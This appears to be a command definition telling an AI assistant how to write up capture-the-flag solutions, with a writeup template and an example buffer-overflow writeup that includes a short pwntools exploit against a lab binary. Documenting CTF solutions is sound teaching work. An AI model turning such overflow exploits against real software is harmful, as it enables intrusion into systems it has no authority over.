# /writeup - Generate Writeup

Generate a professional CTF writeup documenting the solution.

## Usage
```
/writeup <challenge_name>
/writeup <challenge_name> --format markdown
/writeup <challenge_name> --format html
```

## Instructions

When the user invokes `/writeup`, generate a comprehensive writeup:

### 1. Gather Information

Collect from the session:
- Challenge name and category
- Files provided
- Analysis performed
- Vulnerability found
- Exploitation steps
- Flag obtained

### 2. Writeup Structure

Use the template from `templates/writeup_template.md`:

```markdown
# Challenge Name

**Category**: PWN/Crypto/Web/Forensics/RE
**Points**: XXX
**Solves**: XXX
**CTF**: CTF Name 20XX

## Description

> Challenge description from CTF

## Files

- `file1` - Description
- `file2` - Description

## TL;DR

One sentence summary of the solution.

## Reconnaissance

Initial analysis and findings:

```bash
$ file challenge
challenge: ELF 64-bit LSB executable...
```

## Analysis

Detailed vulnerability analysis:

- What was found
- Why it's vulnerable
- Key code snippets (if applicable)

## Exploitation

Step-by-step exploitation:

### Step 1: [Name]

Explanation of this step.

```python
# Code for this step
```

### Step 2: [Name]

...

## Solution

Full exploit script:

```python
#!/usr/bin/env python3
# Full exploit code here
```

## Flag

```
flag{example_flag_here}
```

## Lessons Learned

- Key takeaways
- Techniques used
- What made this challenge interesting
```

### 3. Content Guidelines

**Reconnaissance Section:**
- Show commands run
- Include relevant output
- Explain what each finding means

**Analysis Section:**
- Explain the vulnerability clearly
- Include code snippets if source available
- Use diagrams for complex concepts

**Exploitation Section:**
- Break down into logical steps
- Explain why each step works
- Show input/output at each stage

**Solution Section:**
- Complete, runnable exploit
- Well-commented code
- Handle both local and remote

### 4. Save Writeup

Save to `writeups/` directory:
```
writeups/<ctf_name>/<challenge_name>.md
```

### 5. Optional Enhancements

If requested, add:
- Mermaid diagrams for flow visualization
- Screenshots/hexdumps
- Alternative solutions
- Failed attempts and lessons

## Example Output

```markdown
# Buffer Overflow 101

**Category**: PWN
**Points**: 100
**CTF**: ExampleCTF 2024

## Description

> Can you overflow the buffer and get a shell?

## TL;DR

Classic stack buffer overflow with no protections,
overwrite return address to jump to win function.

## Reconnaissance

```bash
$ checksec --file=vuln
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
```

No protections enabled - straightforward overflow.

## Analysis

The vulnerable function uses `gets()`:

```c
void vuln() {
    char buf[64];
    gets(buf);  // Vulnerable!
}
```

## Exploitation

1. Find offset to return address (72 bytes)
2. Overwrite with address of `win` function (0x401156)

## Solution

```python
from pwn import *
io = process('./vuln')
payload = b'A' * 72 + p64(0x401156)
io.sendline(payload)
io.interactive()
```

## Flag

```
flag{buffer_overflow_101}
```
```
